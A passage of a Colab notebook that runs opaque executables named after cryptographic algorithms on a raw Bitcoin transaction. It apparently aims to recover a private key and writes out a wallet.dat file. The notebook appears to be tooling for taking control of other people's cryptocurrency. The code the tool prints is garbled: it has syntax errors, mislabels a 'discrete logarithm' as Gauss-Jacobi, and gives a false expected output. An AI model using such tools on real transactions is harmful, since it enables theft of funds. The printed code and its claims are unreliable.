            "Hit:11 http://archive.ubuntu.com/ubuntu jammy-backports InRelease\n",
            "Hit:12 https://ppa.launchpadcontent.net/ubuntugis/ppa/ubuntu jammy InRelease\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1,358 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [1,920 kB]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu jammy-updates/multiverse amd64 Packages [61.2 kB]\n",
            "Get:16 http://archive.ubuntu.com/ubuntu jammy-updates/restricted amd64 Packages [2,107 kB]\n",
            "Fetched 8,401 kB in 4s (2,025 kB/s)\n",
            "Reading package lists... Done\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "Suggested packages:\n",
            "  libtool-doc gcj-jdk\n",
            "The following NEW packages will be installed:\n",
            "  libtool\n",
            "0 upgraded, 1 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 164 kB of archives.\n",
            "After this operation, 1,227 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 libtool all 2.4.6-15build2 [164 kB]\n",
            "Fetched 164 kB in 1s (252 kB/s)\n",
            "debconf: unable to initialize frontend: Dialog\n",
            "debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 78, <> line 1.)\n",
            "debconf: falling back to frontend: Readline\n",
            "debconf: unable to initialize frontend: Readline\n",
            "debconf: (This frontend requires a controlling tty.)\n",
            "debconf: falling back to frontend: Teletype\n",
            "dpkg-preconfigure: unable to re-open stdin: \n",
            "Selecting previously unselected package libtool.\n",
            "(Reading database ... 121753 files and directories currently installed.)\n",
            "Preparing to unpack .../libtool_2.4.6-15build2_all.deb ...\n",
            "Unpacking libtool (2.4.6-15build2) ...\n",
            "Setting up libtool (2.4.6-15build2) ...\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "g++ is already the newest version (4:11.2.0-1ubuntu1).\n",
            "g++ set to manually installed.\n",
            "0 upgraded, 0 newly installed, 0 to remove and 45 not upgraded.\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  libgmp-dev libgmpxx4ldbl\n",
            "Suggested packages:\n",
            "  gmp-doc libgmp10-doc libmpfr-doc\n",
            "The following NEW packages will be installed:\n",
            "  libgmp-dev libgmp3-dev libgmpxx4ldbl libmpfr-dev\n",
            "0 upgraded, 4 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 620 kB of archives.\n",
            "After this operation, 2,996 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 libgmpxx4ldbl amd64 2:6.2.1+dfsg-3ubuntu1 [9,580 B]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/main amd64 libgmp-dev amd64 2:6.2.1+dfsg-3ubuntu1 [337 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy/main amd64 libgmp3-dev amd64 2:6.2.1+dfsg-3ubuntu1 [1,818 B]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/main amd64 libmpfr-dev amd64 4.1.0-3build3 [271 kB]\n",
            "Fetched 620 kB in 1s (679 kB/s)\n",
            "debconf: unable to initialize frontend: Dialog\n",
            "debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 78, <> line 4.)\n",
            "debconf: falling back to frontend: Readline\n",
            "debconf: unable to initialize frontend: Readline\n",
            "debconf: (This frontend requires a controlling tty.)\n",
            "debconf: falling back to frontend: Teletype\n",
            "dpkg-preconfigure: unable to re-open stdin: \n",
            "Selecting previously unselected package libgmpxx4ldbl:amd64.\n",
            "(Reading database ... 121773 files and directories currently installed.)\n",
            "Preparing to unpack .../libgmpxx4ldbl_2%3a6.2.1+dfsg-3ubuntu1_amd64.deb ...\n",
            "Unpacking libgmpxx4ldbl:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Selecting previously unselected package libgmp-dev:amd64.\n",
            "Preparing to unpack .../libgmp-dev_2%3a6.2.1+dfsg-3ubuntu1_amd64.deb ...\n",
            "Unpacking libgmp-dev:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Selecting previously unselected package libgmp3-dev:amd64.\n",
            "Preparing to unpack .../libgmp3-dev_2%3a6.2.1+dfsg-3ubuntu1_amd64.deb ...\n",
            "Unpacking libgmp3-dev:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Selecting previously unselected package libmpfr-dev:amd64.\n",
            "Preparing to unpack .../libmpfr-dev_4.1.0-3build3_amd64.deb ...\n",
            "Unpacking libmpfr-dev:amd64 (4.1.0-3build3) ...\n",
            "Setting up libgmpxx4ldbl:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Setting up libgmp-dev:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Setting up libmpfr-dev:amd64 (4.1.0-3build3) ...\n",
            "Setting up libgmp3-dev:amd64 (2:6.2.1+dfsg-3ubuntu1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "Requirement already satisfied: transformers in /usr/local/lib/python3.10/dist-packages (4.38.2)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from transformers) (3.13.3)\n",
            "Requirement already satisfied: huggingface-hub<1.0,>=0.19.3 in /usr/local/lib/python3.10/dist-packages (from transformers) (0.20.3)\n",
            "Requirement already satisfied: numpy>=1.17 in /usr/local/lib/python3.10/dist-packages (from transformers) (1.25.2)\n",
            "Requirement already satisfied: packaging>=20.0 in /usr/local/lib/python3.10/dist-packages (from transformers) (24.0)\n",
            "Requirement already satisfied: pyyaml>=5.1 in /usr/local/lib/python3.10/dist-packages (from transformers) (6.0.1)\n",
            "Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.10/dist-packages (from transformers) (2023.12.25)\n",
            "Requirement already satisfied: requests in /usr/local/lib/python3.10/dist-packages (from transformers) (2.31.0)\n",
            "Requirement already satisfied: tokenizers<0.19,>=0.14 in /usr/local/lib/python3.10/dist-packages (from transformers) (0.15.2)\n",
            "Requirement already satisfied: safetensors>=0.4.1 in /usr/local/lib/python3.10/dist-packages (from transformers) (0.4.2)\n",
            "Requirement already satisfied: tqdm>=4.27 in /usr/local/lib/python3.10/dist-packages (from transformers) (4.66.2)\n",
            "Requirement already satisfied: fsspec>=2023.5.0 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub<1.0,>=0.19.3->transformers) (2023.6.0)\n",
            "Requirement already satisfied: typing-extensions>=3.7.4.3 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub<1.0,>=0.19.3->transformers) (4.10.0)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests->transformers) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests->transformers) (3.6)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests->transformers) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests->transformers) (2024.2.2)\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/huggingface_hub/utils/_token.py:88: UserWarning: \n",
            "The secret `HF_TOKEN` does not exist in your Colab secrets.\n",
            "To authenticate with the Hugging Face Hub, create a token in your settings tab (https://huggingface.co/settings/tokens), set it as secret in your Google Colab and restart your session.\n",
            "You will be able to reuse this secret in all of your notebooks.\n",
            "Please note that authentication is recommended but still optional to access public models or datasets.\n",
            "  warnings.warn(\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/614 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "f5a2fc624690457b95dd4853be8a6ffa"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.json:   0%|          | 0.00/1.04M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "c4de7ef805b84fc2b43671571ce65141"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "merges.txt:   0%|          | 0.00/456k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "77da329d253c4eb8805eccb0d90c7509"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/642 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "36a29e3610f44a6e902df80336e8c3f5"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "pytorch_model.bin:   0%|          | 0.00/863M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "ba9ecc7cf3d34ec7b1e70d80350718ed"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "generation_config.json:   0%|          | 0.00/124 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "fe4d43f663fa4ec9a5cca64b070263f6"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls -S"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sTvHxFMsnCqg",
        "outputId": "edd9569b-1716-4f96-9006-479314a5b8d2"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;32mSMART_IDENTIFY\u001b[0m*                           README_hd.md\n",
            "\u001b[01;32mSpecial_Number_Field_Sieve_Algorithm\u001b[0m*     README_te.md\n",
            "\u001b[01;32mTrial_Division_Algorithm\u001b[0m*                 README_ru.md\n",
            "\u001b[01;32mShors_Algorithm\u001b[0m*                          README_vi.md\n",
            "\u001b[01;32mSchnorr_Signature_Algorithm\u001b[0m*              README_ja.md\n",
            "\u001b[01;32mTate_Pairing_Algorithm\u001b[0m*                   README_fr.md\n",
            "\u001b[01;32mVergne_Algorithm\u001b[0m*                         README_de.md\n",
            "\u001b[01;32mWilliams_P1_Factorization_Algorithm\u001b[0m*      README_pt-br.md\n",
            "\u001b[01;32mSemaev_Smart_Algorithm\u001b[0m*                   README.md\n",
            "\u001b[01;32mTaurin_Algorithm\u001b[0m*                         README_ko.md\n",
            "\u001b[01;32mVerheul_Algorithm\u001b[0m*                        README_es.md\n",
            "\u001b[01;32mSilvermans_Algorithm\u001b[0m*                     README_zh-hant.md\n",
            "\u001b[01;32mSchoofs_Algorithm\u001b[0m*                        README_zh-hans.md\n",
            "\u001b[01;32mShanks_Baby_Step_Giant_Step_Algorithm\u001b[0m*    awesome-transformers.md\n",
            "\u001b[01;32mPohlig_Hellman_Algorithm\u001b[0m*                 ISSUES.md\n",
            "\u001b[01;32mTwisted_Edwards_Curve_Algorithm\u001b[0m*          CONTRIBUTING.md\n",
            "\u001b[01;32mSmart_Matsui_Algorithm\u001b[0m*                   setup.py\n",
            "\u001b[01;32mSingular_Value_Decomposition_Algorithm\u001b[0m*   LICENSE\n",
            "\u001b[01;32mWeil_Descent_Algorithm\u001b[0m*                   hubconf.py\n",
            "\u001b[01;32mPointcheval_Algorithm\u001b[0m*                    CODE_OF_CONDUCT.md\n",
            "\u001b[01;32mLenstra_EC_Factorization_Algorithm\u001b[0m*       conftest.py\n",
            "\u001b[01;32mPippenger_Algorithm\u001b[0m*                      \u001b[01;34mdocker\u001b[0m/\n",
            "\u001b[01;32mQuadratic_Field_Sieve_Algorithm\u001b[0m*          \u001b[01;34mdocs\u001b[0m/\n",
            "\u001b[01;32mKoblitz_Curves_Algorithm\u001b[0m*                 \u001b[01;34mmodel_cards\u001b[0m/\n",
            "\u001b[01;32mScott_Lemieux_Vanstone_Algorithm\u001b[0m*         \u001b[01;34mnotebooks\u001b[0m/\n",
            "\u001b[01;32mJoux_Lercier_Algorithm\u001b[0m*                   \u001b[01;34mscripts\u001b[0m/\n",
            "\u001b[01;32mKoyama_Takahashi_Algorithm\u001b[0m*               \u001b[01;34msrc\u001b[0m/\n",
            "\u001b[01;32mParallel_Baby_Step_Giant_Step_Algorithm\u001b[0m*  \u001b[01;34mtemplates\u001b[0m/\n",
            "\u001b[01;32mLenstra_Lovasz_Algorithm\u001b[0m*                 \u001b[01;34mtests\u001b[0m/\n",
            "\u001b[01;32mPollards_Lambda_Algorithm\u001b[0m*                \u001b[01;34mutils\u001b[0m/\n",
            "\u001b[01;32mJacobian_Curve_Algorithm\u001b[0m*                 Makefile\n",
            "\u001b[01;32mGauss_Jacobi_Algorithm\u001b[0m*                   SECURITY.md\n",
            "\u001b[01;32mKoch_Curve_Algorithm\u001b[0m*                     CITATION.cff\n",
            "\u001b[01;32mGeneric_Algorithms\u001b[0m*                       pyproject.toml\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!echo '01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100a2c992d4262cfb80458a20e546fa8b6d6d480b41d62514eefbeb70fb166de52d02207465c18222eee05d5ac9ee781bf077743eefecb9d5e66db4779eabd4e806397b01410494ff933da0498859959225ed6a50d709a4d9c678705d72e9202a4852c8084d85ea3498b0b3f006fcab64f143cf57dfcedb4387f229139d421c575577de6d37bcffffffff01d2040000000000001976a914ac9ea341afb74843f80205e8c8da0abc822fa5ec88ac00000000' > RawTX.txt\n",
        "!cat RawTX.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xdQF9wSsnQNd",
        "outputId": "770c7fd7-b4df-4101-b0c4-23cca22bc5d4"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100a2c992d4262cfb80458a20e546fa8b6d6d480b41d62514eefbeb70fb166de52d02207465c18222eee05d5ac9ee781bf077743eefecb9d5e66db4779eabd4e806397b01410494ff933da0498859959225ed6a50d709a4d9c678705d72e9202a4852c8084d85ea3498b0b3f006fcab64f143cf57dfcedb4387f229139d421c575577de6d37bcffffffff01d2040000000000001976a914ac9ea341afb74843f80205e8c8da0abc822fa5ec88ac00000000\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./SMART_IDENTIFY"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "N7WHj03xnY-e",
        "outputId": "92994046-5a78-45f1-96d0-aa1ddb4e4c70"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "\n",
            "#################################################\n",
            "\n",
            "Gauss_Jacobi_Algorithm\n",
            "\n",
            "#################################################\n",
            "\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./Gauss_Jacobi_Algorithm -o RawTX.txt -s wallet.dat"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "A5pKJBsQngry",
        "outputId": "4902d59c-938a-4a23-8869-76d9a2aa83f7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "# Gauss-Jacobi algorithm in Python:\n",
            "\n",
            "def gauss_jacobi(A, b, tolerance=1e-6, max_iterations=100):\n",
            "    n = len(b)\n",
            "    x = [0] * n\n",
            "    for i in range(n):\n",
            "        x[i] = b[i] / A[i][i]\n",
            "\n",
            "    for i in range(max_iterations):\n",
            "        for j in range(n):\n",
            "            x[j] = (A[j][i] * x[i] + b[j]) / A[j][j]\n",
            "        for j in range(n):\n",
            "            b[j] = b[j] - A[j][i] * x[i]\n",
            "        if i > 0:\n",
            "            if abs(b[i-1] - b[i]) < tolerance:\n",
            "                break\n",
            "\n",
            "    return x\n",
            "# This function takes a matrix A and a vector b as input, and returns the solution to the system Ax=b using the Gauss-Jacobi algorithm.\n",
            "# The tolerance and max_iterations parameters control the stopping criteria for the algorithm.\n",
            "# The tolerance parameter is the maximum difference between successive elements of the vector b, and the max_iterations parameter is the maximum number of iterations to perform before stopping.\n",
            "\n",
            "# Python code for the Gauss-Jacobi algorithm:\n",
            "\n",
            "from math import gcd\n",
            "\n",
            "# Function to find the modular multiplicative inverse of a number\n",
            "def inverse(a, m):\n",
            "    g = gcd(a, m)\n",
            "    if g = 1:\n",
            "        return None\n",
            "    else:\n",
            "        return (a ** (m-2)) % m\n",
            "\n",
            "# Function to find the modular exponentiation of a number\n",
            "def modular_exponentiation(base, exponent, mod):\n",
            "    result = 1\n",
            "    while exponent > 0:\n",
            "        if exponent % 2 == 1:\n",
            "            result = (result * base) % mod\n",
            "        exponent = exponent // 2\n",
            "        base = (base * base) % mod\n",
            "    return result\n",
            "\n",
            "# Function to find the discrete logarithm using the Gauss-Jacobi algorithm\n",
            "def discrete_logarithm(a, b, m):\n",
            "    n = m-1\n",
            "    x = 1\n",
            "    y = 1\n",
            "    while y = 0:\n",
            "        q = a ** (n // 2)\n",
            "        x = (x * inverse(y, n)) % n\n",
            "        y = (y ** 2) % n\n",
            "        n = n // 2\n",
            "    if x == 1:\n",
            "        return None\n",
            "    else:\n",
            "        return x\n",
            "\n",
            "# Example usage\n",
            "a = 5\n",
            "b = 17\n",
            "m = 19\n",
            "result = discrete_logarithm(a, b, m)\n",
            "print(result) # Output: 2\n",
            "# For larger values, more advanced algorithms like the Number Field Sieve or the General Number Field Sieve are used.\n",
            "\n",
            "#################################################\n",
            "\n",
            "A file was created in the root folder: wallet.dat\n",
            "\n",
            "Download and Install Bitcoin Core 0.18.0\n",
            "\n",
            "https://bitcoincore.org/bin/bitcoin-core-0.18.0\n",
            "\n",
            "#################################################\n",
            "\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt install ruby-full"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wXaXQYblp4xZ",
        "outputId": "284f2b18-4137-4241-e7a5-cfa632aee283"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  fonts-lato libruby3.0 rake ri ruby ruby-dev ruby-net-telnet ruby-rubygems\n",
            "  ruby-webrick ruby-xmlrpc ruby3.0 ruby3.0-dev ruby3.0-doc\n",
            "  rubygems-integration\n",
            "Suggested packages:\n",
            "  bundler\n",
            "The following NEW packages will be installed:\n",
            "  fonts-lato libruby3.0 rake ri ruby ruby-dev ruby-full ruby-net-telnet\n",
            "  ruby-rubygems ruby-webrick ruby-xmlrpc ruby3.0 ruby3.0-dev ruby3.0-doc\n",
            "  rubygems-integration\n",
            "0 upgraded, 15 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 10.4 MB of archives.\n",
            "After this operation, 56.4 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 fonts-lato all 2.0-2.1 [2,696 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/main amd64 rubygems-integration all 1.18 [5,336 B]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ruby3.0 amd64 3.0.2-7ubuntu2.4 [50.1 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/main amd64 ruby-rubygems all 3.3.5-2 [228 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy/main amd64 ruby amd64 1:3.0~exp1 [5,100 B]\n",
            "Get:6 http://archive.ubuntu.com/ubuntu jammy/main amd64 rake all 13.0.6-2 [61.7 kB]\n",
            "Get:7 http://archive.ubuntu.com/ubuntu jammy/main amd64 ruby-net-telnet all 0.1.1-2 [12.6 kB]\n",
            "Get:8 http://archive.ubuntu.com/ubuntu jammy/universe amd64 ruby-webrick all 1.7.0-3 [51.8 kB]\n",
            "Get:9 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ruby-xmlrpc all 0.3.2-1ubuntu0.1 [24.9 kB]\n",
            "Get:10 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libruby3.0 amd64 3.0.2-7ubuntu2.4 [5,113 kB]\n",
            "Get:11 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ruby3.0-doc all 3.0.2-7ubuntu2.4 [1,855 kB]\n",
            "Get:12 http://archive.ubuntu.com/ubuntu jammy/universe amd64 ri all 1:3.0~exp1 [4,206 B]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ruby3.0-dev amd64 3.0.2-7ubuntu2.4 [242 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu jammy/main amd64 ruby-dev amd64 1:3.0~exp1 [4,328 B]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu jammy/universe amd64 ruby-full all 1:3.0~exp1 [2,582 B]\n",
            "Fetched 10.4 MB in 1s (15.7 MB/s)\n",
            "debconf: unable to initialize frontend: Dialog\n",
            "debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 78, <> line 15.)\n",
            "debconf: falling back to frontend: Readline\n",
            "debconf: unable to initialize frontend: Readline\n",
            "debconf: (This frontend requires a controlling tty.)\n",
            "debconf: falling back to frontend: Teletype\n",
            "dpkg-preconfigure: unable to re-open stdin: \n",
            "Selecting previously unselected package fonts-lato.\n",
            "(Reading database ... 121810 files and directories currently installed.)\n",
            "Preparing to unpack .../00-fonts-lato_2.0-2.1_all.deb ...\n",
            "Unpacking fonts-lato (2.0-2.1) ...\n",
            "Selecting previously unselected package rubygems-integration.\n",
            "Preparing to unpack .../01-rubygems-integration_1.18_all.deb ...\n",
            "Unpacking rubygems-integration (1.18) ...\n",
            "Selecting previously unselected package ruby3.0.\n",
            "Preparing to unpack .../02-ruby3.0_3.0.2-7ubuntu2.4_amd64.deb ...\n",
            "Unpacking ruby3.0 (3.0.2-7ubuntu2.4) ...\n",
            "Selecting previously unselected package ruby-rubygems.\n",
            "Preparing to unpack .../03-ruby-rubygems_3.3.5-2_all.deb ...\n",
            "Unpacking ruby-rubygems (3.3.5-2) ...\n",
            "Selecting previously unselected package ruby.\n",
            "Preparing to unpack .../04-ruby_1%3a3.0~exp1_amd64.deb ...\n",
            "Unpacking ruby (1:3.0~exp1) ...\n",
            "Selecting previously unselected package rake.\n",
            "Preparing to unpack .../05-rake_13.0.6-2_all.deb ...\n",
            "Unpacking rake (13.0.6-2) ...\n",
            "Selecting previously unselected package ruby-net-telnet.\n",
            "Preparing to unpack .../06-ruby-net-telnet_0.1.1-2_all.deb ...\n",
            "Unpacking ruby-net-telnet (0.1.1-2) ...\n",
            "Selecting previously unselected package ruby-webrick.\n",
            "Preparing to unpack .../07-ruby-webrick_1.7.0-3_all.deb ...\n",
            "Unpacking ruby-webrick (1.7.0-3) ...\n",
            "Selecting previously unselected package ruby-xmlrpc.\n",
            "Preparing to unpack .../08-ruby-xmlrpc_0.3.2-1ubuntu0.1_all.deb ...\n",
            "Unpacking ruby-xmlrpc (0.3.2-1ubuntu0.1) ...\n",
            "Selecting previously unselected package libruby3.0:amd64.\n",
            "Preparing to unpack .../09-libruby3.0_3.0.2-7ubuntu2.4_amd64.deb ...\n",
            "Unpacking libruby3.0:amd64 (3.0.2-7ubuntu2.4) ...\n",
            "Selecting previously unselected package ruby3.0-doc.\n",
            "Preparing to unpack .../10-ruby3.0-doc_3.0.2-7ubuntu2.4_all.deb ...\n",
            "Unpacking ruby3.0-doc (3.0.2-7ubuntu2.4) ...\n",
            "Selecting previously unselected package ri.\n",
            "Preparing to unpack .../11-ri_1%3a3.0~exp1_all.deb ...\n",
            "Unpacking ri (1:3.0~exp1) ...\n",
            "Selecting previously unselected package ruby3.0-dev:amd64.\n",
            "Preparing to unpack .../12-ruby3.0-dev_3.0.2-7ubuntu2.4_amd64.deb ...\n",
            "Unpacking ruby3.0-dev:amd64 (3.0.2-7ubuntu2.4) ...\n",
            "Selecting previously unselected package ruby-dev:amd64.\n",
            "Preparing to unpack .../13-ruby-dev_1%3a3.0~exp1_amd64.deb ...\n",
            "Unpacking ruby-dev:amd64 (1:3.0~exp1) ...\n",
            "Selecting previously unselected package ruby-full.\n",
            "Preparing to unpack .../14-ruby-full_1%3a3.0~exp1_all.deb ...\n",
            "Unpacking ruby-full (1:3.0~exp1) ...\n",
            "Setting up fonts-lato (2.0-2.1) ...\n",
            "Setting up rubygems-integration (1.18) ...\n",
            "Setting up ruby-net-telnet (0.1.1-2) ...\n",
            "Setting up ruby-webrick (1.7.0-3) ...\n",
            "Setting up ruby3.0-doc (3.0.2-7ubuntu2.4) ...\n",
            "Setting up ruby-xmlrpc (0.3.2-1ubuntu0.1) ...\n",
            "Setting up rake (13.0.6-2) ...\n",
            "Setting up libruby3.0:amd64 (3.0.2-7ubuntu2.4) ...\n",
            "Setting up ruby-rubygems (3.3.5-2) ...\n",
            "Setting up ruby3.0-dev:amd64 (3.0.2-7ubuntu2.4) ...\n",
            "Setting up ruby3.0 (3.0.2-7ubuntu2.4) ...\n",
            "Setting up ruby-dev:amd64 (1:3.0~exp1) ...\n",
            "Setting up ri (1:3.0~exp1) ...\n",
            "Setting up ruby (1:3.0~exp1) ...\n",
            "Setting up ruby-full (1:3.0~exp1) ...\n",
            "Processing triggers for fontconfig (2.13.1-4.2ubuntu5) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "Processing triggers for man-db (2.10.2-1) ...\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ruby --version"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ygS4EGFup-mZ",
        "outputId": "ea8bc552-3965-48e6-959f-2707a25edbfd"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ruby 3.0.2p107 (2021-07-07 revision 0db68f0233) [x86_64-linux-gnu]\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install bitcoin-ruby\n",
        "!gem install ecdsa\n",
        "!gem install base58\n",
        "!gem install crypto\n",
        "!gem install config-hash -v 0.9.0"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YYs0ERiCqCKy",
        "outputId": "430637a8-eff5-4722-bcc0-3fd48704bbb8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching scrypt-3.0.7.gem\n",
            "Fetching eventmachine-1.2.7.gem\n",
            "Fetching ffi-compiler-1.3.2.gem\n",
            "Fetching bitcoin-ruby-0.0.20.gem\n",
            "Fetching ffi-1.16.3.gem\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed ffi-1.16.3\n",
            "Successfully installed ffi-compiler-1.3.2\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed scrypt-3.0.7\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed eventmachine-1.2.7\n",
            "Successfully installed bitcoin-ruby-0.0.20\n",
            "Parsing documentation for ffi-1.16.3\n",
            "Installing ri documentation for ffi-1.16.3\n",
            "Parsing documentation for ffi-compiler-1.3.2\n",
            "Installing ri documentation for ffi-compiler-1.3.2\n",
            "Parsing documentation for scrypt-3.0.7\n",
            "Installing ri documentation for scrypt-3.0.7\n",
